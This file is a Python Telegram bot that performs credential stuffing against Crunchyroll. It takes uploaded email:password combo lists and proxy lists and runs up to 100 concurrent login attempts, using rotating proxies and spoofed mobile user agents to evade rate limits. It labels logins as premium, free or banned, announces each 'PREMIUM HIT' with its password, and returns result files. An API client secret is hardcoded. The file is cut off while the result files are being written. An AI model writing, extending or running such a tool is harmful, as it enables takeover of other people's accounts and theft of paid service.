import telegram
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram import Update
import requests
import re
import uuid
from datetime import datetime
import random
import asyncio
import io
import os
import threading
import time
from typing import Dict, List, Optional

# ==================== CONFIGURATION ====================
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
if not TELEGRAM_TOKEN:
    raise ValueError("TELEGRAM_TOKEN environment variable not set")

# Crunchyroll API endpoints
AUTH_URL = "https://beta-api.crunchyroll.com/auth/v1/token"
ACCOUNT_URL = "https://beta-api.crunchyroll.com/accounts/v1/me"
MULTIPROFILE_URL = "https://beta-api.crunchyroll.com/accounts/v1/me/multiprofile"
BENEFITS_URL = "https://beta-api.crunchyroll.com/subs/v1/subscriptions/{}/benefits"

# Client credentials
CLIENT_ID = "ajcylfwdtjjtq7qpgks3"
CLIENT_SECRET = "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_"

# Anti-duplicate system
processed_messages = set()
message_lock = threading.Lock()

# Global storage
user_proxies: Dict[int, 'ProxyManager'] = {}
user_active_counters: Dict[int, int] = {}
user_thread_settings: Dict[int, int] = {}

# ==================== COUNTRY FLAGS ====================
COUNTRY_FLAGS = {
    "AF": "Afghanistan 🇦🇫", "AX": "Åland Islands 🇦🇽", "AL": "Albania 🇦🇱",
    "DZ": "Algeria 🇩🇿", "AS": "American Samoa 🇦🇸", "AD": "Andorra 🇦🇩",
    "AO": "Angola 🇦🇴", "AI": "Anguilla 🇦🇮", "AQ": "Antarctica 🇦🇶",
    "AG": "Antigua and Barbuda 🇦🇬", "AR": "Argentina 🇦🇷", "AM": "Armenia 🇦🇲",
    "AW": "Aruba 🇦🇼", "AU": "Australia 🇦🇺", "AT": "Austria 🇦🇹",
    "AZ": "Azerbaijan 🇦🇿", "BS": "Bahamas 🇧🇸", "BH": "Bahrain 🇧🇭",
    "BD": "Bangladesh 🇧🇩", "BB": "Barbados 🇧🇧", "BY": "Belarus 🇧🇾",
    "BE": "Belgium 🇧🇪", "BZ": "Belize 🇧🇿", "BJ": "Benin 🇧🇯",
    "BM": "Bermuda 🇧🇲", "BT": "Bhutan 🇧🇹", "BO": "Bolivia 🇧🇴",
    "BA": "Bosnia and Herzegovina 🇧🇦", "BW": "Botswana 🇧🇼", "BR": "Brazil 🇧🇷",
    "BN": "Brunei 🇧🇳", "BG": "Bulgaria 🇧🇬", "BF": "Burkina Faso 🇧🇫",
    "BI": "Burundi 🇧🇮", "KH": "Cambodia 🇰🇭", "CM": "Cameroon 🇨🇲",
    "CA": "Canada 🇨🇦", "CV": "Cape Verde 🇨🇻", "KY": "Cayman Islands 🇰🇾",
    "CF": "Central African Republic 🇨🇫", "TD": "Chad 🇹🇩", "CL": "Chile 🇨🇱",
    "CN": "China 🇨🇳", "CO": "Colombia 🇨🇴", "CG": "Congo 🇨🇬",
    "CR": "Costa Rica 🇨🇷", "CI": "Côte d'Ivoire 🇨🇮", "HR": "Croatia 🇭🇷",
    "CU": "Cuba 🇨🇺", "CY": "Cyprus 🇨🇾", "CZ": "Czech Republic 🇨🇿",
    "DK": "Denmark 🇩🇰", "DJ": "Djibouti 🇩🇯", "DM": "Dominica 🇩🇲",
    "DO": "Dominican Republic 🇩🇴", "EC": "Ecuador 🇪🇨", "EG": "Egypt 🇪🇬",
    "SV": "El Salvador 🇸🇻", "EE": "Estonia 🇪🇪", "ET": "Ethiopia 🇪🇹",
    "FJ": "Fiji 🇫🇯", "FI": "Finland 🇫🇮", "FR": "France 🇫🇷",
    "DE": "Germany 🇩🇪", "GH": "Ghana 🇬🇭", "GR": "Greece 🇬🇷",
    "GT": "Guatemala 🇬🇹", "GN": "Guinea 🇬🇳", "HT": "Haiti 🇭🇹",
    "HN": "Honduras 🇭🇳", "HK": "Hong Kong 🇭🇰", "HU": "Hungary 🇭🇺",
    "IS": "Iceland 🇮🇸", "IN": "India 🇮🇳", "ID": "Indonesia 🇮🇩",
    "IR": "Iran 🇮🇷", "IQ": "Iraq 🇮🇶", "IE": "Ireland 🇮🇪",
    "IL": "Israel 🇮🇱", "IT": "Italy 🇮🇹", "JM": "Jamaica 🇯🇲",
    "JP": "Japan 🇯🇵", "JO": "Jordan 🇯🇴", "KZ": "Kazakhstan 🇰🇿",
    "KE": "Kenya 🇰🇪", "KW": "Kuwait 🇰🇼", "KG": "Kyrgyzstan 🇰🇬",
    "LA": "Laos 🇱🇦", "LV": "Latvia 🇱🇻", "LB": "Lebanon 🇱🇧",
    "LY": "Libya 🇱🇾", "LT": "Lithuania 🇱🇹", "LU": "Luxembourg 🇱🇺",
    "MO": "Macau 🇲🇴", "MG": "Madagascar 🇲🇬", "MY": "Malaysia 🇲🇾",
    "MV": "Maldives 🇲🇻", "ML": "Mali 🇲🇱", "MT": "Malta 🇲🇹",
    "MX": "Mexico 🇲🇽", "MD": "Moldova 🇲🇩", "MC": "Monaco 🇲🇨",
    "MN": "Mongolia 🇲🇳", "ME": "Montenegro 🇲🇪", "MA": "Morocco 🇲🇦",
    "MZ": "Mozambique 🇲🇿", "MM": "Myanmar 🇲🇲", "NA": "Namibia 🇳🇦",
    "NP": "Nepal 🇳🇵", "NL": "Netherlands 🇳🇱", "NZ": "New Zealand 🇳🇿",
    "NI": "Nicaragua 🇳🇮", "NE": "Niger 🇳🇪", "NG": "Nigeria 🇳🇬",
    "NO": "Norway 🇳🇴", "OM": "Oman 🇴🇲", "PK": "Pakistan 🇵🇰",
    "PS": "Palestine 🇵🇸", "PA": "Panama 🇵🇦", "PY": "Paraguay 🇵🇾",
    "PE": "Peru 🇵🇪", "PH": "Philippines 🇵🇭", "PL": "Poland 🇵🇱",
    "PT": "Portugal 🇵🇹", "PR": "Puerto Rico 🇵🇷", "QA": "Qatar 🇶🇦",
    "RO": "Romania 🇷🇴", "RU": "Russia 🇷🇺", "RW": "Rwanda 🇷🇼",
    "SA": "Saudi Arabia 🇸🇦", "SN": "Senegal 🇸🇳", "RS": "Serbia 🇷🇸",
    "SG": "Singapore 🇸🇬", "SK": "Slovakia 🇸🇰", "SI": "Slovenia 🇸🇮",
    "SO": "Somalia 🇸🇴", "ZA": "South Africa 🇿🇦", "KR": "South Korea 🇰🇷",
    "ES": "Spain 🇪🇸", "LK": "Sri Lanka 🇱🇰", "SD": "Sudan 🇸🇩",
    "SE": "Sweden 🇸🇪", "CH": "Switzerland 🇨🇭", "SY": "Syria 🇸🇾",
    "TW": "Taiwan 🇹🇼", "TJ": "Tajikistan 🇹🇯", "TZ": "Tanzania 🇹🇿",
    "TH": "Thailand 🇹🇭", "TG": "Togo 🇹🇬", "TN": "Tunisia 🇹🇳",
    "TR": "Turkey 🇹🇷", "TM": "Turkmenistan 🇹🇲", "UG": "Uganda 🇺🇬",
    "UA": "Ukraine 🇺🇦", "AE": "United Arab Emirates 🇦🇪", "GB": "United Kingdom 🇬🇧",
    "US": "United States 🇺🇸", "UY": "Uruguay 🇺🇾", "UZ": "Uzbekistan 🇺🇿",
    "VE": "Venezuela 🇻🇪", "VN": "Vietnam 🇻🇳", "YE": "Yemen 🇾🇪",
    "ZM": "Zambia 🇿🇲", "ZW": "Zimbabwe 🇿🇼"
}

# ==================== USER AGENTS ====================
USER_AGENTS = [
    "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0",
    "Crunchyroll/3.75.0 Android/11 okhttp/4.12.0",
    "Crunchyroll/3.76.1 Android/12 okhttp/4.12.0",
    "Crunchyroll/3.77.0 Android/13 okhttp/4.12.0",
    "Crunchyroll/4.0.0 Android/10 okhttp/4.12.0",
]

# ==================== DECORATORS ====================
def prevent_duplicate(func):
    """Decorator to prevent duplicate message processing"""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not update.message:
            return

        message_key = f"{update.update_id}_{update.message.from_user.id}_{hash(update.message.text or '')}"

        with message_lock:
            if message_key in processed_messages:
                return  # Skip duplicate
            processed_messages.add(message_key)

            # Clean old messages periodically
            if len(processed_messages) > 500:
                processed_messages.clear()

        return await func(update, context)
    return wrapper

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self):
        self.proxies: List[Dict[str, str]] = []
        self.current_index = 0
        self.lock = threading.Lock()

    def add_proxy(self, proxy_string: str) -> bool:
        """Add a proxy in format ip:port:user:pass or ip:port"""
        try:
            parts = proxy_string.strip().split(':')
            if len(parts) == 4:
                ip, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{ip}:{port}',
                    'https': f'http://{username}:{password}@{ip}:{port}'
                }
                with self.lock:
                    self.proxies.append(proxy_dict)
                return True
            elif len(parts) == 2:
                ip, port = parts
                proxy_dict = {
                    'http': f'http://{ip}:{port}',
                    'https': f'http://{ip}:{port}'
                }
                with self.lock:
                    self.proxies.append(proxy_dict)
                return True
        except Exception as e:
            print(f"Error adding proxy: {e}")
        return False

    def get_next_proxy(self) -> Optional[Dict[str, str]]:
        """Get next proxy in rotation - thread safe"""
        if not self.proxies:
            return None

        with self.lock:
            proxy = self.proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.proxies)
            return proxy

    def clear_proxies(self):
        """Clear all proxies"""
        with self.lock:
            self.proxies.clear()
            self.current_index = 0

    def get_proxy_count(self) -> int:
        """Get number of proxies"""
        with self.lock:
            return len(self.proxies)

# ==================== HELPER FUNCTIONS ====================
def get_user_proxy_manager(user_id: int) -> ProxyManager:
    """Get or create proxy manager for user"""
    if user_id not in user_proxies:
        user_proxies[user_id] = ProxyManager()
    return user_proxies[user_id]

def get_user_thread_setting(user_id: int) -> int:
    """Get thread setting for user (default: 25 threads)"""
    return user_thread_settings.get(user_id, 25)

def set_user_thread_setting(user_id: int, threads: int):
    """Set thread setting for user"""
    user_thread_settings[user_id] = max(1, min(threads, 100))

def increment_user_active_counter(user_id: int) -> int:
    """Increment active counter for user - thread safe"""
    with message_lock:
        if user_id not in user_active_counters:
            user_active_counters[user_id] = 0
        user_active_counters[user_id] += 1
        return user_active_counters[user_id]

def get_random_user_agent() -> str:
    """Get random user agent"""
    return random.choice(USER_AGENTS)

def generate_guid() -> str:
    """Generate random GUID"""
    return str(uuid.uuid4())

def parse_json_value(text: str, key: str) -> Optional[str]:
    """Parse JSON value by key"""
    try:
        pattern = rf'"{key}"\s*:\s*"([^"]*)"'
        match = re.search(pattern, text)
        if match:
            return match.group(1)

        # Try without quotes for boolean/number values
        pattern = rf'"{key}"\s*:\s*([^,}}]+)'
        match = re.search(pattern, text)
        if match:
            return match.group(1).strip()
    except Exception as e:
        print(f"Error parsing {key}: {e}")
    return None

def get_country_flag(country_code: str) -> str:
    """Get country name with flag"""
    return COUNTRY_FLAGS.get(country_code.upper(), f"{country_code} 🌍")

def format_date(date_str: Optional[str]) -> str:
    """Format ISO date to readable format"""
    if not date_str:
        return "N/A"
    try:
        dt = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
        return dt.strftime("%B %d, %Y")
    except:
        return date_str

def get_speed_indicator(threads: int) -> str:
    """Get speed indicator based on thread count"""
    if threads >= 75:
        return "🚀 ULTRA SPEED MODE"
    elif threads >= 50:
        return "⚡ HIGH SPEED MODE"
    elif threads >= 25:
        return "🔥 TURBO MODE"
    else:
        return "⚙️ STANDARD MODE"

# ==================== ACCOUNT CHECKER ====================
async def check_single_account(email: str, password: str, proxy_manager: Optional[ProxyManager] = None) -> Dict:
    """Check a single Crunchyroll account"""
    try:
        # Generate GUID
        device_id = generate_guid()
        user_agent = get_random_user_agent()

        # Get proxy if available
        proxy = proxy_manager.get_next_proxy() if proxy_manager else None

        with requests.Session() as session:
            if proxy:
                session.proxies.update(proxy)

            # Step 1: Authentication
            auth_headers = {
                "host": "beta-api.crunchyroll.com",
                "x-datadog-sampling-priority": "0",
                "content-type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip",
                "user-agent": user_agent
            }

            auth_data = (
                f"grant_type=password&username={email}&password={password}"
                f"&scope=offline_access&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}"
                f"&device_type=SamsungTV&device_id={device_id}&device_name=SM-G998U"
            )

            auth_response = session.post(AUTH_URL, headers=auth_headers, data=auth_data, timeout=30)

            # Check for invalid credentials
            if "invalid_grant" in auth_response.text or "error" in auth_response.text:
                if "force_password_reset" in auth_response.text:
                    return {"status": "RESET_REQUIRED", "email": email, "password": password}
                return {"status": "INVALID", "email": email, "password": password}

            # Check for rate limiting
            if "rate limited" in auth_response.text.lower():
                return {"status": "RATE_LIMITED", "email": email, "password": password}

            # Extract token and account ID
            access_token = parse_json_value(auth_response.text, "access_token")
            account_id = parse_json_value(auth_response.text, "account_id")

            if not access_token:
                return {"status": "ERROR", "email": email, "password": password, "error": "No access token"}

            # Step 2: Get account info
            account_headers = {
                "host": "beta-api.crunchyroll.com",
                "authorization": f"Bearer {access_token}",
                "etp-anonymous-id": device_id,
                "accept-encoding": "gzip",
                "user-agent": user_agent
            }

            account_response = session.get(ACCOUNT_URL, headers=account_headers, timeout=30)

            if account_response.status_code == 403:
                return {"status": "BANNED", "email": email, "password": password}

            # Extract account details
            external_id = parse_json_value(account_response.text, "external_id") or account_id
            email_verified = parse_json_value(account_response.text, "email_verified")
            created_at = parse_json_value(account_response.text, "created")

            # Step 3: Get multiprofile info
            multiprofile_response = session.get(MULTIPROFILE_URL, headers=account_headers, timeout=30)

            profile_name = parse_json_value(multiprofile_response.text, "profile_name")
            max_profiles = parse_json_value(multiprofile_response.text, "tier_max_profiles")

            # Count total profiles
            profile_ids = re.findall(r'"profile_id"', multiprofile_response.text)
            total_profiles = len(profile_ids)

            # Step 4: Get benefits/subscription info
            benefits_response = session.get(
                BENEFITS_URL.format(external_id), 
                headers=account_headers, 
                timeout=30
            )

            subscription_country = parse_json_value(benefits_response.text, "subscription_country")

            # Check if it's a free account
            if "accounts.get_account_info.forbidden" in account_response.text:
                return {
                    "status": "FREE",
                    "email": email,
                    "password": password,
                    "email_verified": email_verified == "true",
                    "created_at": format_date(created_at)
                }

            # Check for premium indicators
            is_premium = False
            if max_profiles and int(max_profiles) > 1:
                is_premium = True
            if "premium" in multiprofile_response.text.lower():
                is_premium = True

            result = {
                "status": "PREMIUM" if is_premium else "FREE",
                "email": email,
                "password": password,
                "email_verified": email_verified == "true",
                "created_at": format_date(created_at),
                "profile_name": profile_name or "N/A",
                "total_profiles": total_profiles,
                "max_profiles": max_profiles or "1",
                "country": get_country_flag(subscription_country) if subscription_country else "N/A",
                "account_id": external_id
            }

            return result

    except requests.exceptions.Timeout:
        return {"status": "TIMEOUT", "email": email, "password": password}
    except requests.exceptions.ProxyError:
        return {"status": "PROXY_ERROR", "email": email, "password": password}
    except Exception as e:
        return {"status": "ERROR", "email": email, "password": password, "error": str(e)}

# ==================== BOT COMMANDS ====================
@prevent_duplicate
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command - show welcome message"""
    welcome_text = """
🎌 <b>Crunchyroll Account Checker Bot</b> 🎌

Welcome! This bot helps you check Crunchyroll accounts quickly and efficiently.

<b>📋 Available Commands:</b>

🔍 <b>/check email:password</b>
   Check a single account

📦 <b>/combo</b>
   Upload a file with email:password combos

🌐 <b>/proxy ip:port:user:pass</b>
   Add a single proxy

📁 <b>/proxies</b>
   Upload a file with proxies

⚡ <b>/threads 50</b>
   Set concurrent threads (1-100)
   Default: 25 threads

📊 <b>/status</b>
   View your current settings

🗑️ <b>/clearproxy</b>
   Remove all your proxies

<b>⚙️ Features:</b>
✅ Multi-threaded checking (up to 100 threads)
✅ Proxy rotation support
✅ Real-time progress updates
✅ Premium account detection
✅ Country/region detection
✅ Profile information
✅ Automatic result file generation

<b>💡 Tips:</b>
• Upload combos in format: <code>email:password</code>
• Use proxies for better speed and avoid rate limits
• Higher threads = faster checking (but requires good proxies)

Ready to start? Use /check or /combo! 🚀
"""
    await update.message.reply_text(welcome_text, parse_mode='HTML')

@prevent_duplicate
async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check single account command"""
    user_id = update.message.from_user.id

    if not context.args:
        await update.message.reply_text(
            "❌ <b>Invalid format!</b>\n\n"
            "Usage: <code>/check email:password</code>\n"
            "Example: <code>/check user@example.com:password123</code>",
            parse_mode='HTML'
        )
        return

    combo = ' '.join(context.args)

    if ':' not in combo:
        await update.message.reply_text(
            "❌ <b>Invalid format!</b>\n\n"
            "Please use format: <code>email:password</code>",
            parse_mode='HTML'
        )
        return

    parts = combo.split(':', 1)
    if len(parts) != 2:
        await update.message.reply_text("❌ Invalid combo format!", parse_mode='HTML')
        return

    email, password = parts

    # Send checking message
    checking_msg = await update.message.reply_text(
        f"🔍 <b>Checking account...</b>\n\n"
        f"📧 Email: <code>{email}</code>\n"
        f"⏳ Please wait...",
        parse_mode='HTML'
    )

    # Get proxy manager
    proxy_manager = get_user_proxy_manager(user_id)

    # Check account
    result = await check_single_account(email, password, proxy_manager)

    # Format response
    if result["status"] == "PREMIUM":
        hit_number = increment_user_active_counter(user_id)
        response = f"""
💎 <b>PREMIUM HIT #{hit_number}</b> 💎

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>

✅ <b>Status:</b> Premium Account
✉️ <b>Email Verified:</b> {'Yes ✔️' if result.get('email_verified') else 'No ❌'}
📅 <b>Created:</b> {result.get('created_at', 'N/A')}
👤 <b>Profile Name:</b> {result.get('profile_name', 'N/A')}
📊 <b>Profiles:</b> {result.get('total_profiles')}/{result.get('max_profiles')}
🌍 <b>Country:</b> {result.get('country', 'N/A')}
🆔 <b>Account ID:</b> <code>{result.get('account_id', 'N/A')}</code>
"""
    elif result["status"] == "FREE":
        response = f"""
🆓 <b>FREE ACCOUNT</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>

✅ <b>Status:</b> Valid (Free Account)
✉️ <b>Email Verified:</b> {'Yes ✔️' if result.get('email_verified') else 'No ❌'}
📅 <b>Created:</b> {result.get('created_at', 'N/A')}
"""
    elif result["status"] == "INVALID":
        response = f"""
❌ <b>INVALID</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>

Status: Invalid credentials
"""
    elif result["status"] == "BANNED":
        response = f"""
🚫 <b>BANNED ACCOUNT</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>

Status: Account is banned/suspended
"""
    elif result["status"] == "RESET_REQUIRED":
        response = f"""
⚠️ <b>PASSWORD RESET REQUIRED</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>

Status: Password reset required
"""
    elif result["status"] == "RATE_LIMITED":
        response = f"""
⏱️ <b>RATE LIMITED</b>

📧 <b>Email:</b> <code>{result['email']}</code>

Status: Too many requests. Try again later or add proxies.
"""
    elif result["status"] == "TIMEOUT":
        response = f"""
⏱️ <b>TIMEOUT</b>

📧 <b>Email:</b> <code>{result['email']}</code>

Status: Request timed out
"""
    elif result["status"] == "PROXY_ERROR":
        response = f"""
🌐 <b>PROXY ERROR</b>

📧 <b>Email:</b> <code>{result['email']}</code>

Status: Proxy connection failed
"""
    else:
        response = f"""
❓ <b>ERROR</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>

Status: {result.get('error', 'Unknown error')}
"""

    await checking_msg.edit_text(response, parse_mode='HTML')

@prevent_duplicate
async def combo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Combo command - prompt for file upload"""
    await update.message.reply_text(
        "📦 <b>Bulk Account Checking</b>\n\n"
        "Please upload a <b>.txt file</b> containing accounts in this format:\n"
        "<code>email:password</code>\n\n"
        "One account per line.\n\n"
        "💡 <b>Tip:</b> Make sure to set your thread count with /threads before checking!",
        parse_mode='HTML'
    )

@prevent_duplicate
async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add single proxy command"""
    user_id = update.message.from_user.id

    if not context.args:
        await update.message.reply_text(
            "❌ <b>Invalid format!</b>\n\n"
            "Usage: <code>/proxy ip:port:user:pass</code>\n"
            "Or: <code>/proxy ip:port</code>\n\n"
            "Example: <code>/proxy 1.2.3.4:8080:username:password</code>",
            parse_mode='HTML'
        )
        return

    proxy_string = ' '.join(context.args)
    proxy_manager = get_user_proxy_manager(user_id)

    if proxy_manager.add_proxy(proxy_string):
        await update.message.reply_text(
            f"✅ <b>Proxy added successfully!</b>\n\n"
            f"Total proxies: <b>{proxy_manager.get_proxy_count()}</b>",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text(
            "❌ <b>Failed to add proxy!</b>\n\n"
            "Please check the format and try again.",
            parse_mode='HTML'
        )

@prevent_duplicate
async def proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Proxies command - prompt for file upload"""
    await update.message.reply_text(
        "🌐 <b>Proxy Upload</b>\n\n"
        "Please upload a <b>.txt file</b> containing proxies in this format:\n"
        "<code>ip:port:user:pass</code>\n"
        "Or: <code>ip:port</code>\n\n"
        "One proxy per line.\n\n"
        "💡 The proxies will be used in rotation for all your checks!",
        parse_mode='HTML'
    )

@prevent_duplicate
async def threads_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set thread count command"""
    user_id = update.message.from_user.id

    if not context.args:
        current_threads = get_user_thread_setting(user_id)
        await update.message.reply_text(
            f"⚡ <b>Thread Configuration</b>\n\n"
            f"Current threads: <b>{current_threads}</b>\n\n"
            f"Usage: <code>/threads [1-100]</code>\n"
            f"Example: <code>/threads 50</code>\n\n"
            f"💡 Higher threads = faster checking (but requires good proxies)",
            parse_mode='HTML'
        )
        return

    try:
        threads = int(context.args[0])
        if threads < 1 or threads > 100:
            await update.message.reply_text(
                "❌ Thread count must be between 1 and 100!",
                parse_mode='HTML'
            )
            return

        set_user_thread_setting(user_id, threads)
        speed_indicator = get_speed_indicator(threads)

        await update.message.reply_text(
            f"✅ <b>Thread count updated!</b>\n\n"
            f"Threads: <b>{threads}</b>\n"
            f"Mode: {speed_indicator}\n\n"
            f"💡 Your checks will now use {threads} concurrent threads!",
            parse_mode='HTML'
        )
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid number! Please provide a number between 1 and 100.",
            parse_mode='HTML'
        )

@prevent_duplicate
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user status command"""
    user_id = update.message.from_user.id
    proxy_manager = get_user_proxy_manager(user_id)
    threads = get_user_thread_setting(user_id)
    hits = user_active_counters.get(user_id, 0)
    speed_indicator = get_speed_indicator(threads)

    status_text = f"""
📊 <b>Your Configuration</b>

👤 <b>User ID:</b> <code>{user_id}</code>
⚡ <b>Threads:</b> {threads}
🎯 <b>Mode:</b> {speed_indicator}
🌐 <b>Proxies:</b> {proxy_manager.get_proxy_count()}
💎 <b>Total Hits:</b> {hits}

<b>💡 Tips:</b>
• Use /threads to adjust speed
• Use /proxy to add more proxies
• Higher threads require more proxies
"""
    await update.message.reply_text(status_text, parse_mode='HTML')

@prevent_duplicate
async def clearproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear all proxies command"""
    user_id = update.message.from_user.id
    proxy_manager = get_user_proxy_manager(user_id)

    old_count = proxy_manager.get_proxy_count()
    proxy_manager.clear_proxies()

    await update.message.reply_text(
        f"🗑️ <b>Proxies cleared!</b>\n\n"
        f"Removed <b>{old_count}</b> proxies from your list.",
        parse_mode='HTML'
    )

# ==================== FILE HANDLERS ====================
@prevent_duplicate
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file uploads"""
    user_id = update.message.from_user.id
    document = update.message.document

    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            "❌ Please upload a .txt file only!",
            parse_mode='HTML'
        )
        return

    # Check if it's a proxy file
    caption = update.message.caption or ''
    is_proxy_file = 'proxy' in caption.lower() or 'proxies' in document.file_name.lower()

    if is_proxy_file:
        await handle_proxy_file(update, context, document)
    else:
        await handle_combo_file(update, context, document)

async def handle_proxy_file(update: Update, context: ContextTypes.DEFAULT_TYPE, document):
    """Handle proxy file upload"""
    user_id = update.message.from_user.id

    # Download file
    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()

    # Parse proxies
    lines = file_content.decode('utf-8', errors='ignore').splitlines()
    proxy_manager = get_user_proxy_manager(user_id)

    added_count = 0
    for line in lines:
        line = line.strip()
        if line and ':' in line:
            if proxy_manager.add_proxy(line):
                added_count += 1

    await update.message.reply_text(
        f"✅ <b>Proxies loaded!</b>\n\n"
        f"Added: <b>{added_count}</b> proxies\n"
        f"Total proxies: <b>{proxy_manager.get_proxy_count()}</b>\n\n"
        f"💡 Proxies will be used in rotation for all checks!",
        parse_mode='HTML'
    )

async def handle_combo_file(update: Update, context: ContextTypes.DEFAULT_TYPE, document):
    """Handle combo file upload and process accounts"""
    user_id = update.message.from_user.id

    # Send initial message
    progress_msg = await update.message.reply_text(
        "📥 <b>Downloading file...</b>",
        parse_mode='HTML'
    )

    # Download file
    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()

    # Parse accounts
    lines = file_content.decode('utf-8', errors='ignore').splitlines()
    accounts = []

    for line in lines:
        line = line.strip()
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2:
                accounts.append({"email": parts[0].strip(), "password": parts[1].strip()})

    if not accounts:
        await progress_msg.edit_text(
            "❌ <b>No valid accounts found!</b>\n\n"
            "Please make sure your file contains accounts in format:\n"
            "<code>email:password</code>",
            parse_mode='HTML'
        )
        return

    # Update message
    threads = get_user_thread_setting(user_id)
    proxy_manager = get_user_proxy_manager(user_id)
    speed_indicator = get_speed_indicator(threads)

    await progress_msg.edit_text(
        f"🚀 <b>Starting bulk check...</b>\n\n"
        f"📦 Total accounts: <b>{len(accounts)}</b>\n"
        f"⚡ Threads: <b>{threads}</b>\n"
        f"🌐 Proxies: <b>{proxy_manager.get_proxy_count()}</b>\n"
        f"🎯 Mode: {speed_indicator}\n\n"
        f"⏳ Processing...",
        parse_mode='HTML'
    )

    # Process accounts
    results = await process_bulk_accounts(
        accounts, 
        user_id, 
        proxy_manager, 
        threads, 
        progress_msg
    )

    # Generate result files
    await generate_result_files(update, results, user_id)

async def process_bulk_accounts(
    accounts: List[Dict],
    user_id: int,
    proxy_manager: ProxyManager,
    threads: int,
    progress_msg
) -> Dict:
    """Process bulk accounts with progress updates"""
    results = {
        "premium": [],
        "free": [],
        "invalid": [],
        "banned": [],
        "error": []
    }

    total = len(accounts)
    checked = 0
    start_time = time.time()
    last_edit_time = 0

    # Create semaphore for limiting concurrent tasks
    semaphore = asyncio.Semaphore(threads)

    async def check_with_semaphore(account):
        nonlocal checked, last_edit_time
        async with semaphore:
            result = await check_single_account(
                account["email"],
                account["password"],
                proxy_manager
            )

            checked += 1

            # Categorize result
            status = result.get("status", "ERROR")
            if status == "PREMIUM":
                results["premium"].append(result)

                # Show premium hit immediately
                hit_number = increment_user_active_counter(user_id)
                hit_msg = f"""
💎 <b>PREMIUM HIT #{hit_number}</b> 💎

📧 <code>{result['email']}:{result['password']}</code>

✅ Status: Premium Account
🌍 Country: {result.get('country', 'N/A')}
📊 Profiles: {result.get('total_profiles')}/{result.get('max_profiles')}
"""
                try:
                    await progress_msg.reply_text(hit_msg, parse_mode='HTML')
                except:
                    pass

            elif status == "FREE":
                results["free"].append(result)
            elif status == "BANNED":
                results["banned"].append(result)
            elif status == "INVALID" or status == "RESET_REQUIRED":
                results["invalid"].append(result)
            else:
                results["error"].append(result)

            # Update progress every 2 seconds (rate limit protection)
            current_time = time.time()
            if current_time - last_edit_time >= 2:
                last_edit_time = current_time
                elapsed = current_time - start_time
                speed = checked / elapsed if elapsed > 0 else 0
                percentage = (checked / total) * 100

                progress_text = f"""
🔄 <b>Checking Accounts...</b>

📊 Progress: {checked}/{total} ({percentage:.1f}%)
💎 Premium: <b>{len(results['premium'])}</b>
🆓 Free: {len(results['free'])}
❌ Invalid: {len(results['invalid'])}
🚫 Banned: {len(results['banned'])}
⚠️ Errors: {len(results['error'])}

⚡ Speed: {speed:.1f} acc/s
⏱️ Elapsed: {int(elapsed)}s
🌐 Using: {proxy_manager.get_proxy_count()} proxies
"""
                try:
                    await progress_msg.edit_text(progress_text, parse_mode='HTML')
                except:
                    pass

            return result

    # Process all accounts concurrently
    tasks = [check_with_semaphore(account) for account in accounts]
    await asyncio.gather(*tasks)

    # Final summary
    elapsed = time.time() - start_time
    speed = total / elapsed if elapsed > 0 else 0

    summary_text = f"""
✅ <b>Checking Complete!</b>

📊 <b>Results Summary:</b>
💎 Premium: <b>{len(results['premium'])}</b>
🆓 Free: <b>{len(results['free'])}</b>
❌ Invalid: <b>{len(results['invalid'])}</b>
🚫 Banned: <b>{len(results['banned'])}</b>
⚠️ Errors: <b>{len(results['error'])}</b>

📦 Total: {total} accounts
⚡ Avg Speed: {speed:.2f} acc/s
⏱️ Total Time: {int(elapsed)}s

📁 Generating result files...
"""
    try:
        await progress_msg.edit_text(summary_text, parse_mode='HTML')
    except:
        pass

    return results

async def generate_result_files(update: Update, results: Dict, user_id: int):
    """Generate and send result files"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    # Generate premium file
    if results["premium"]:
        premium_content = ""
        for acc in results["premium"]:
            premium_content += f"{acc['email']}:{acc['password']}\n"

        premium_file = io.BytesIO(premium_content.encode('utf-8'))
        premium_file.name = f"crunchyroll_premium_{timestamp}.txt"

        await update.message.reply_document(
            document=premium_file,
            caption=f"💎 <b>Premium Accounts</b>\n\nTotal: {len(results['premium'])}",
            parse_mode='HTML'
        )

    # Generate free file
    if results["free"]:
        free_content = ""
        for acc in results["free"]:
            free_content += f"{acc['email']}:{acc['password']}\n"

